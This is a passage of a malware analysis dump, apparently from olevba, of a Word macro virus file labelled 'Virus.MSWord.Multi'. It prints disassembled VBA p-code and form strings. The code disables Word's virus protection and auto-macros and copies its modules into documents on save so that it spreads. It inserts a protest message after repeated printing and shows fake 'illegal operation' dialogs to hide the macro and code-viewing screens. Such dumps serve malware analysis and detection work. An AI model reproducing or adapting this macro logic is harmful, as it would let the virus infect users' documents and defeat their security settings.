+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #274:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #275:
+' 	LitStr 0x0076 "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #276:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #277:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #278:
+' 	LitStr 0x007A "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #279:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #280:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #281:
+' 	LitStr 0x007E "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #282:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #283:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #284:
+' 	LitStr 0x0082 "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #285:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #286:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #287:
+' 	LitStr 0x0086 "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #288:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #289:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #290:
+' 	LitStr 0x008A "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #291:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #292:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #293:
+' 	LitStr 0x008E "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #294:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #295:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #296:
+' 	LitStr 0x0092 "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #297:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #298:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #299:
+' 	LitStr 0x0096 "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #300:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #301:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #302:
+' 	LitStr 0x009A "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #303:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #304:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #305:
+' 	LitStr 0x009E "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #306:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #307:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #308:
+' 	LitStr 0x00A2 "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #309:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #310:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #311:
+' 	LitStr 0x00A6 "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #312:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #313:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #314:
+' 	LitStr 0x00AA "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #315:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #316:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #317:
+' 	LitStr 0x00AE "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #318:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #319:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #320:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0008 "Compteur"
+' 	LitStr 0x0001 "1"
+' 	LitStr 0x000C "Winword8.ini"
+' 	Ld WordBasic 
+' 	ArgsMemCall SetPrivateProfileString 0x0004 
+' Line #321:
+' 	EndIfBlock 
+' Line #322:
+' 	Label ErrorAO 
+' Line #323:
+' 	EndSub 
+' Line #324:
+' 	FuncDefn (Sub FileSaveAs())
+' Line #325:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #326:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #327:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #328:
+' 	OnError ErrorFSA 
+' Line #329:
+' 	Ld wdDialogFileSaveAs 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #330:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000A "MultiVirus"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #331:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #332:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #333:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #334:
+' 	Label ErrorFSA 
+' Line #335:
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatDocument 
+' 	Eq 
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatTemplate 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #336:
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #337:
+' 	EndIfBlock 
+' Line #338:
+' 	EndSub 
+' Line #339:
+' 	FuncDefn (Sub FilePrint())
+' Line #340:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #341:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #342:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #343:
+' 	OnError ErrorFP 
+' Line #344:
+' 	ArgsCall InsertPayload 0x0000 
+' Line #345:
+' 	Ld wdDialogFilePrint 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #346:
+' 	Label ErrorFP 
+' Line #347:
+' 	EndSub 
+' Line #348:
+' 	FuncDefn (Sub FilePrintDefault())
+' Line #349:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #350:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #351:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #352:
+' 	OnError ErrorFPD 
+' Line #353:
+' 	ArgsCall InsertPayload 0x0000 
+' Line #354:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall PrintOut 0x0000 
+' Line #355:
+' 	Label ErrorFPD 
+' Line #356:
+' 	EndSub 
+' Line #357:
+' 	FuncDefn (Sub FileTemplates())
+' Line #358:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #359:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #360:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #361:
+' 	OnError ErrorFT 
+' Line #362:
+' 	Ld UserForm900 
+' 	ArgsMemCall Show 0x0000 
+' Line #363:
+' 	Label ErrorFT 
+' Line #364:
+' 	EndSub 
+' Line #365:
+' 	FuncDefn (Sub InsertPayload())
+' Line #366:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #367:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #368:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #369:
+' 	OnError ErrorIP 
+' Line #370:
+' 	Dim 
+' 	VarDefn WPrint
+' 	VarDefn Adding
+' Line #371:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0009 "NbrePrint"
+' 	LitStr 0x000D "Nuclear98.ini"
+' 	Ld WordBasic 
+' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
+' 	St WPrint$ 
+' Line #372:
+' 	Ld WPrint$ 
+' 	Ld WordBasic 
+' 	ArgsMemLd Val 0x0001 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St Adding 
+' Line #373:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0009 "NbrePrint"
+' 	Ld Adding 
+' 	ArgsLd Str 0x0001 
+' 	LitStr 0x000D "Nuclear98.ini"
+' 	Ld WordBasic 
+' 	ArgsMemCall SetPrivateProfileString 0x0004 
+' Line #374:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0009 "NbrePrint"
+' 	LitStr 0x000D "Nuclear98.ini"
+' 	Ld WordBasic 
+' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
+' 	St WPrint$ 
+' Line #375:
+' 	Ld WPrint$ 
+' 	LitDI2 0x000C 
+' 	Eq 
+' 	IfBlock 
+' Line #376:
+' 	Ld wdLine 
+' 	ParamNamed Unit 
+' 	Ld Selection 
+' 	ArgsMemCall EndKey 0x0001 
+' Line #377:
+' 	Ld Selection 
+' 	ArgsMemCall TypeParagraph 0x0000 
+' Line #378:
+' 	LitStr 0x001F "And finally i would like to say"
+' 	ParamNamed Then 
+' 	Ld Selection 
+' 	ArgsMemCall TypeText 0x0001 
+' Line #379:
+' 	Ld Selection 
+' 	ArgsMemCall TypeParagraph 0x0000 
+' Line #380:
+' 	Ld Selection 
+' 	ArgsMemCall TypeParagraph 0x0000 
+' Line #381:
+' 	LitStr 0x002F "STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC!"
+' 	ParamNamed Then 
+' 	Ld Selection 
+' 	ArgsMemCall TypeText 0x0001 
+' Line #382:
+' 	Ld wdLine 
+' 	ParamNamed Unit 
+' 	Ld Selection 
+' 	ArgsMemCall HomeKey 0x0001 
+' Line #383:
+' 	Ld wdLine 
+' 	ParamNamed Unit 
+' 	Ld wdExtend 
+' 	ParamNamed Extend 
+' 	Ld Selection 
+' 	ArgsMemCall EndKey 0x0002 
+' Line #384:
+' 	Ld wdToggle 
+' 	Ld Selection 
+' 	MemLd Font 
+' 	MemSt Bold 
+' Line #385:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0009 "NbrePrint"
+' 	LitStr 0x0001 "1"
+' 	LitStr 0x000D "Nuclear98.ini"
+' 	Ld WordBasic 
+' 	ArgsMemCall SetPrivateProfileString 0x0004 
+' Line #386:
+' 	EndIfBlock 
+' Line #387:
+' 	Label ErrorIP 
+' Line #388:
+' 	EndSub 
+' Line #389:
+' 	FuncDefn (Sub ToolsMacro())
+' Line #390:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #391:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #392:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #393:
+' 	OnError ErrorTM 
+' Line #394:
+' 	Ld UserForm999 
+' 	ArgsMemCall Show 0x0000 
+' Line #395:
+' 	Label ErrorTM 
+' Line #396:
+' 	EndSub 
+' Line #397:
+' 	FuncDefn (Sub ViewVBCode())
+' Line #398:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #399:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #400:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #401:
+' 	OnError ErrorVVBC 
+' Line #402:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #403:
+' 	Label ErrorVVBC 
+' Line #404:
+' 	EndSub 
+' Macros/VBA/UserForm900 - 3117 bytes
+' Line #0:
+' Line #1:
+' Line #2:
+' Line #3:
+' Line #4:
+' 	FuncDefn (Private Sub CommandButton1_Click())
+' Line #5:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #6:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #7:
+' 	EndSub 
+' Line #8:
+' Line #9:
+' 	FuncDefn (Private Sub CommandButton2_Click())
+' Line #10:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #11:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #12:
+' 	EndSub 
+' Line #13:
+' Line #14:
+' 	FuncDefn (Private Sub CommandButton3_Click())
+' Line #15:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #16:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #17:
+' 	EndSub 
+' Line #18:
+' Line #19:
+' 	FuncDefn (Private Sub CommandButton4_Click())
+' Line #20:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #21:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #22:
+' 	EndSub 
+' Line #23:
+' Line #24:
+' 	FuncDefn (Private Sub CommandButton5_Click())
+' Line #25:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #26:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #27:
+' 	EndSub 
+' Line #28:
+' Line #29:
+' 	FuncDefn (Private Sub CommandButton6_Click())
+' Line #30:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #31:
+' 	EndSub 
+' Line #32:
+' Line #33:
+' 	FuncDefn (Private Sub UserForm_Initialize())
+' Line #34:
+' 	Ld NormalTemplate 
+' 	MemLd New 
+' 	Ld TextBox1 
+' 	MemSt Then 
+' Line #35:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton2 
+' 	MemSt Enabled 
+' Line #36:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #37:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #38:
+' 	EndSub 
+' Macros/VBA/UserForm999 - 7660 bytes
+' Line #0:
+' Line #1:
+' Line #2:
+' Line #3:
+' Line #4:
+' Line #5:
+' Line #6:
+' Line #7:
+' Line #8:
+' 	FuncDefn (Private Sub ListBox1_Click())
+' Line #9:
+' 	LitDI2 0x0000 
+' 	Ld ListBox1 
+' 	ArgsMemLd Selected 0x0001 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #10:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #11:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #12:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #13:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #14:
+' 	LitDI2 0x0001 
+' 	Ld ListBox1 
+' 	ArgsMemLd Selected 0x0001 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	ElseIfBlock 
+' Line #15:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #16:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #17:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #18:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #19:
+' 	ElseBlock 
+' Line #20:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #21:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #22:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #23:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #24:
+' 	EndIfBlock 
+' Line #25:
+' 	EndSub 
+' Line #26:
+' Line #27:
+' 	FuncDefn (Private Sub UserForm_Initialize())
+' Line #28:
+' 	LitStr 0x000D "Commande Word"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #29:
+' 	LitStr 0x0017 "Tous les modèles actifs"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #30:
+' 	LitStr 0x001A "Normal.dot (modèle global)"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #31:
+' 	Ld WordBasic 
+' 	ArgsMemLd WindowName$ 0x0000 
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #32:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #33:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #34:
+' 	LitStr 0x000F "Macro créée le "
+' 	Ld Date 
+' 	Concat 
+' 	LitStr 0x0005 " par "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	Ld TextBox2 
+' 	MemSt Then 
+' Line #35:
+' 	EndSub 
+' Line #36:
+' Line #37:
+' 	FuncDefn (Private Sub CommandButton1_Click())
+' Line #38:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #39:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #40:
+' 	EndSub 
+' Line #41:
+' 	FuncDefn (Private Sub CommandButton2_Click())
+' Line #42:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #43:
+' 	EndSub 
+' Line #44:
+' Line #45:
+' 	FuncDefn (Private Sub CommandButton3_Click())
+' Line #46:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #47:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #48:
+' 	EndSub 
+' Line #49:
+' Line #50:
+' 	FuncDefn (Private Sub CommandButton4_Click())
+' Line #51:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #52:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #53:
+' 	EndSub 
+' Line #54:
+' Line #55:
+' 	FuncDefn (Private Sub CommandButton5_Click())
+' Line #56:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #57:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #58:
+' 	EndSub 
+' Line #59:
+' Line #60:
+' 	FuncDefn (Private Sub CommandButton6_Click())
+' Line #61:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #62:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #63:
+' 	EndSub 
+' Line #64:
+' Line #65:
+' 	FuncDefn (Private Sub CommandButton7_Click())
+' Line #66:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #67:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #68:
+' 	EndSub 
+' Line #69:
+' 	FuncDefn (Private Sub ScrollBar1_Change())
+' Line #70:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #71:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #72:
+' 	EndSub 
+' Line #73:
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Mod�le de documentctS
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Mise � jour automatique des styles de documentS
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Mod�les globaux et compl�mentsL
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Les �l�ments coch�s sont d�j� en m�moire.
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Attacher...9D
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ajouter
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Supprimer..9E
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Organiser...E
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
